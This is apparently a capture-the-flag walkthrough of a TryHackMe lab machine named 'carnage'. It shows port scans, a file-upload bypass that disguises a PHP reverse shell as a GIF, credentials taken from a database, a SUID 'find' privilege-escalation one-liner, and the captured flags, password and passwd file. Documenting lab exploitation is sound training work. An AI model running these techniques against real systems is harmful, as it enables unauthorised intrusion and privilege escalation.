THM-KOTH:	carnage
============================

> labruhtooryboi | December15, 2020


# 10.10.74.229
# carnage.thm


					# reconnisance

Nmap scan report for 10.10.74.229
Host is up (0.22s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Hill Studios - Index
81/tcp   open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Hill Studios - Index
82/tcp   open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Hill Studios - Index
83/tcp   open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Fri, 04 Dec 2020 19:39:23 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data.

					# enumeration

'''
http://carnage.thm:82/upload.php
'''




					# exploitation

'''			
*edit upload request with ZAP

*bits to edit

Content-Disposition: form-data; name="file"; filename="rphp.gif.php"
Content-Type: image/gif


*result

Stored in: images/rphp.gif.php


*exeute rev shell
http://10.10.74.229:82/images/rphp.gif.php
'''



					# privelage escalation
					
'''
/var/www/html/web1/web.db
'''

'''
SQLite format 3
Ctableusersusers
CREATE TABLE users ( username TEXT NOT NULL PRIMARY KEY, password TEXT NOT NULL, flag TEXT))
indexsqlite_autoindex_users_1users
-ubobba-`G)8(t/NDkZ"u^{dGhtezljYTE0MDhiMzUyYWQ0NWIyNThhZmQ4ZDM3OTdmODVmfQo=
	bobba
'''

'''
user:bobba
passwd:-`G)8(t/NDkZ"u^{
'''

*as bobba
'''
/usr/bin/find

find . -exec /bin/bash -p \; -quit
'''

'''
*cant write to king.txt but appending works
echo 'username' >> king.txt
'''
		



					# interesting things

>flags
'''
/home/duku/
thm{1de4afafdee712c083aff746991d5345}
'''

'''
/var/www/html/web1/web.db
thm{9ca1408b352ad45b258afd8d3797f85f}
'''

'''
/home/bobba
thm{06834aac0714586f2b2f925cf49bcd31}
'''

'''
/root
thm{7dcad4ed4067a5a0d58e92fd022e35f4}
'''

'''
/var/www/html/web2/
thm{5e7ea083245c2971820ee4d00ed74e29}
'''

'''
/home/yoda
thm{8934b42e39ea3a1529b36390954f0f2a}
'''

'''
/var/www/html/web3/flag.txt
thm{43f20e3ed108dda8c2383e5fa0286854}
'''

>users
'''
root
duku
bobba
yoda
'''

>passwds
'''
-`G)8(t/NDkZ"u^{
'''


>files and dirs
'''
http:82
upload.php
'''

'''
/var/www/html/web1/web.db
/var/www/html/web2/flag.txt
/var/www/html/web3/flag.txt
/home/bobba/flag1.txt
/home/yoda/flag2.txt
/home/duku/flag3.txt
/root/flag4.txt
'''

'''
/usr/bin/find
'''



>root stuff 
'''
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
statd:x:105:65534::/var/lib/nfs:/bin/false
messagebus:x:106:112::/var/run/dbus:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
bobba:x:1000:1000:Bobba Fett:/home/bobba:/bin/sh
yoda:x:1001:1002:see /home/yoda/link:/home/yoda:/bin/sh
duku:x:1002:1003:Count me:/home/duku:/bin/sh
'''
